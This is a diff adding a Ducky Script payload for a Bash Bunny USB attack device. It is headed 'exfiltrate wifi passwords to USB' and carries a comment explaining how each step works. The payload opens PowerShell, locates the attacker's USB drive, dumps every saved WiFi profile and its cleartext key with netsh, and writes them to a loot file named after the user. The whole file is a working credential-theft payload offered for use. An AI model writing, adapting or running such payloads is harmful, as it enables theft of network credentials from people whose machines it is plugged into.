@@ -1,0 +1,34 @@
+REM exfiltrate wifi passwords to USB
+REM created by: M4rc14n0
+REM run powershell command 
+REM https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines?view=powershell-7.3
+REM In PS %{} is used to do an action for every value in the array received in the pipeline. The $_ or $PSItem variable will contain the current value.
+
+REM Let computer recognize our bashbunny 1s
+DELAY 1000
+
+REM open powershell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+REM cd into the bashbunny, add clipboard
+REM Get the drive letter for the USB
+REM $u=gwmi Win32_Volume will bring all the computer information
+REM |?{$_.Label -eq'BashBunny'} will filter those related to a drive called BashBunny
+REM |select name will filter to get only the name field
+REM The information is in a structure with a field called name where the name of the drive letter is stored
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name
+ENTER
+DELAY 200
+STRING cd $u.name; cd loot
+ENTER
+DELAY 200
+REM Extract all WiFi profiles stored and for each will extract the name and password to store them in the file
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >$env:UserName".txt"; exit
+ENTER
+DELAY 200
+
+FINISH
